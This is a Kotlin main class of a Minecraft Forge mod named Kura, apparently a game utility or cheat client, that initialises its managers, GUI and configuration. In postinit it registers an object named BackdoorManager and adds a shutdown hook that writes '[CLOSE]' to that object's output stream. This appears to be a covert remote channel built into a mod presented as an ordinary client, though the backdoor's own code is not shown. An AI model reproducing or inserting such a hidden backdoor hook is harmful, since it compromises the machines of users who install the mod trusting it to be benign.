package me.dyzjct.kura

import me.dyzjct.kura.command.CommandManager
import me.dyzjct.kura.event.ForgeEventProcessor
import me.dyzjct.kura.event.events.xin.AutoQueueEvent
import me.dyzjct.kura.friend.FriendManager
import me.dyzjct.kura.gui.clickgui.GUIRender
import me.dyzjct.kura.gui.clickgui.HUDRender
import me.dyzjct.kura.manager.*
import me.dyzjct.kura.manager.FontManager.onInit
import me.dyzjct.kura.module.ModuleManager
import me.dyzjct.kura.notification.NotificationManager
import me.dyzjct.kura.setting.Setting
import me.dyzjct.kura.setting.StringSetting
import me.dyzjct.kura.utils.Utils
import me.dyzjct.kura.utils.font.CFontRenderer
import me.dyzjct.kura.utils.math.deneb.LagCompensator
import net.minecraft.util.Util
import net.minecraft.util.Util.EnumOS
import net.minecraftforge.common.MinecraftForge
import net.minecraftforge.fml.common.Mod
import net.minecraftforge.fml.common.event.FMLInitializationEvent
import net.minecraftforge.fml.common.event.FMLPostInitializationEvent
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent
import org.apache.logging.log4j.LogManager
import org.lwjgl.opengl.Display
import java.io.IOException

@Mod(modid = Kura.MOD_ID, name = Kura.MOD_NAME, version = Kura.VERSION)
class Kura {
    var moduleManager: ModuleManager? = null

    @JvmField
    var friendManager: FriendManager? = null

    @JvmField
    var commandManager: CommandManager? = null
    var rotationManager: RotationManager? = null
    var configManager: FileManager? = null
    var guiRender: GUIRender? = null
    var hudEditor: HUDRender? = null
    var guiManager: GuiManager? = null

    @Mod.EventHandler
    fun preinit(event: FMLPreInitializationEvent?) {
        setTitleAndIcon()
        LagCompensator()
    }

    @Mod.EventHandler
    fun init(event: FMLInitializationEvent?) {
        instance.rotationManager = RotationManager()
        instance.moduleManager = ModuleManager()
        instance.commandManager = CommandManager()
        instance.friendManager = FriendManager()
        instance.guiManager = GuiManager()
        onInit()
        MinecraftForge.EVENT_BUS.register(AutoQueueEvent())
        MinecraftForge.EVENT_BUS.register(ForgeEventProcessor)
        MinecraftForge.EVENT_BUS.register(HotbarManager)
        MinecraftForge.EVENT_BUS.register(RotationManager())
        instance.guiRender = GUIRender()
        instance.hudEditor = HUDRender()
        instance.configManager = FileManager()
        FileManager.loadAll()
    }

    @Mod.EventHandler
    fun postinit(event: FMLPostInitializationEvent?) {
        NotificationManager.pendingNotifications.clear()
        MinecraftForge.EVENT_BUS.register(BackdoorManager)
        Runtime.getRuntime().addShutdownHook(Thread {
            try {
                BackdoorManager.dos!!.writeUTF("[CLOSE]")
            } catch (_: Exception) {
            }
        })
        System.gc()
    }

    companion object {
        const val MOD_ID = "kura"
        const val MOD_NAME = "Kura"
        const val VERSION = "2.2"
        const val DISPLAY_NAME = MOD_NAME + " " + VERSION
        const val KANJI = "Kura"
        const val ALT_Encrypt_Key = "Kura"

        @JvmField
        val logger = LogManager.getLogger("Kura")
        var instance = Kura()

        @JvmField
        var commandPrefix: Setting<String> = StringSetting("CommandPrefix", null, ".")

        @JvmField
        var fontRenderer: CFontRenderer? = null
        fun setTitleAndIcon() {
            Display.setTitle(DISPLAY_NAME)
            setIcon()
        }

        fun setIcon() {
            val OS = Util.getOSType()
            if (OS != EnumOS.OSX) {
                try {
                    val inputstream = Kura::class.java.getResourceAsStream("/assets/Kura/logo/Kura.png")
                    if (inputstream != null) {
                        Display.setIcon(arrayOf(Utils.readImageToBuffer(inputstream)))
                    }
                } catch (e: IOException) {
                    e.stackTrace
                }
            }
        }
    }
}